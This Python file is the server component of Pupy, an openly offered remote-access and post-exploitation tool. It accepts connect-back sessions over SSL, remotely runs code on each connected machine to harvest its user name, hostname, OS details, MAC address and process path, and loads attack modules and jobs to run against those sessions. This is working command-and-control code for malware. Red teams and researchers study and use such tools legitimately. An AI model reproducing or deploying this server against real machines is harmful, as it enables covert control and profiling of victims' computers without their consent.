# -*- coding: UTF8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import threading
from rpyc.utils.authenticators import SSLAuthenticator
from rpyc.utils.server import ThreadPoolServer
from . import PupyService
import textwrap
import pkgutil
import modules
import logging
from .PupyErrors import PupyModuleExit, PupyModuleError
from .PupyJob import PupyJob
from .PupyCmd import color_real

try:
	import ConfigParser as configparser
except ImportError:
	import configparser
from . import PupyClient
import os.path

class PupyServer(threading.Thread):
	def __init__(self, configFile="pupy.conf"):
		super(PupyServer, self).__init__()
		self.daemon=True
		self.server=None
		self.authenticator=None
		self.clients=[]
		self.jobs={}
		self.jobs_id=1
		self.clients_lock=threading.Lock()
		self.current_id=1
		self.config = configparser.ConfigParser()
		self.config.read(configFile)
		self.port=self.config.getint("pupyd","port")
		self.address=self.config.get("pupyd","address")
		self.handler=None

	def register_handler(self, instance):
		""" register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
		self.handler=instance

	def add_client(self, conn):
		with self.clients_lock:
			conn.execute(textwrap.dedent(
			"""
			import platform
			import getpass
			import uuid
			import sys
			import os
			import locale
			os_encoding = locale.getpreferredencoding() or "utf8"
			def get_uuid():
				user=None
				node=None
				plat=None
				release=None
				version=None
				machine=None
				macaddr=None
				pid=None
				proc_arch=None
				proc_path=sys.executable
				try:
					user=getpass.getuser().decode(encoding=os_encoding).encode("utf8")
				except Exception:
					pass
				try:
					node=platform.node().decode(encoding=os_encoding).encode("utf8")
				except Exception:
					pass
				try:
					version=platform.platform()
				except Exception:
					pass
				try:
					plat=platform.system()
				except Exception:
					pass
				try:
					release=platform.release()
				except Exception:
					pass
				try:
					version=platform.version()
				except Exception:
					pass
				try:
					machine=platform.machine()
				except Exception:
					pass
				try:
					pid=os.getpid()
				except Exception:
					pass
				try:
					proc_arch=platform.architecture()[0]
				except Exception:
					pass
				try:
					macaddr=uuid.getnode()
					macaddr=':'.join(("%012X" % macaddr)[i:i+2] for i in range(0, 12, 2))
				except Exception:
					pass
				return (user, node, plat, release, version, machine, macaddr, pid, proc_arch, proc_path)
				"""))
			l=conn.namespace["get_uuid"]()
			
			self.clients.append(PupyClient.PupyClient({
				"id": self.current_id,
				"conn" : conn,
				"user" : l[0],
				"hostname" : l[1],
				"platform" : l[2],
				"release" : l[3],
				"version" : l[4],
				"os_arch" : l[5],
				"proc_arch" : l[8],
				"exec_path" : l[9],
				"macaddr" : l[6],
				"pid" : l[7],
				"address" : conn._conn._config['connid'].split(':')[0],
			}, self))

			if self.handler:
				addr = conn.modules['pupy'].get_connect_back_host()
				server_ip, server_port = addr.rsplit(':', 1)
				client_ip, client_port = conn._conn._config['connid'].split(':')
				self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(self.current_id, server_ip, server_port, client_ip, client_port))

			self.current_id += 1

	def remove_client(self, client):
		with self.clients_lock:
			for i,c in enumerate(self.clients):
				if c.conn is client:
					if self.handler:
						self.handler.display_srvinfo('Session {} closed'.format(self.clients[i].desc['id']))
					del self.clients[i]
					break

	def get_clients(self, search_criteria):
		""" return a list of clients corresponding to the search criteria. ex: platform:*win* """ 
		#if the criteria is a simple id we return the good client
		try:
			index=int(search_criteria)
			for c in self.clients:
				if int(c.desc["id"])==index:
					return [c]
			return []
		except Exception:
			pass
		l=set([])
		if search_criteria=="*":
			return self.clients
		for c in self.clients:
			take=False
			for sc in search_criteria.split():
				tab=sc.split(":",1)
				if len(tab)==2 and tab[0] in [x for x in c.desc.iterkeys()]:#if the field is specified we search for the value in this field
					take=True
					if not tab[1].lower() in str(c.desc[tab[0]]).lower():
						take=False
						break
				elif len(tab)!=2:#if there is no field specified we search in every field for at least one match
					take=False
					for k,v in c.desc.iteritems():
						if type(v) is unicode or type(v) is str:
							if tab[0].lower() in v.decode('utf8').lower():
								take=True
								break
						else:
							if tab[0].lower() in str(v).decode('utf8').lower():
								take=True
								break
					if not take:
						break
			if take:
				l.add(c)
		return list(l)
			
	def get_clients_list(self):
		return self.clients

	def list_modules(self):
		l=[]
		for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
			module=self.get_module(module_name)
			l.append((module_name,module.__doc__))
		return l

	def get_module_completer(self, module_name):
		""" return the module PupyCompleter if any is defined"""
		module=self.get_module(module_name)
		ps=module(None,None)
		return ps.arg_parser.get_completer()

	def get_module(self, name):
		script_found=False
		for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
			if module_name==name:
				script_found=True
				module=loader.find_module(module_name).load_module(module_name)
				class_name=None
				if hasattr(module,"__class_name__"):
					class_name=module.__class_name__
					if not hasattr(module,class_name):
						logging.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(script_name,class_name))
				if not class_name:
					#TODO automatically search the class name in the file
					pass
				return getattr(module,class_name)

	def module_parse_args(self, module_name, args):
		""" This method is used by the PupyCmd class to verify validity of arguments passed to a specific module """
		module=self.get_module(module_name)
		ps=module(None,None)
		return ps.arg_parser.parse_args(args)

	def del_job(self, job_id):
		if job_id is not None:
			job_id=int(job_id)
			if job_id in self.jobs:
				del self.jobs[job_id]

	def add_job(self, job):
		job.id=self.jobs_id
		self.jobs[self.jobs_id]=job
		self.jobs_id+=1

	def get_job(self, job_id):
		try:
			job_id=int(job_id)
		except ValueError:
			raise PupyModuleError("job id must be an integer !")
		if job_id not in self.jobs:
			raise PupyModuleError("%s: no such job !"%job_id)
		return self.jobs[job_id]
		
	def run(self):
		self.authenticator = SSLAuthenticator(self.config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), self.config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")
		self.server = ThreadPoolServer(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=self.authenticator)
		self.server.start()


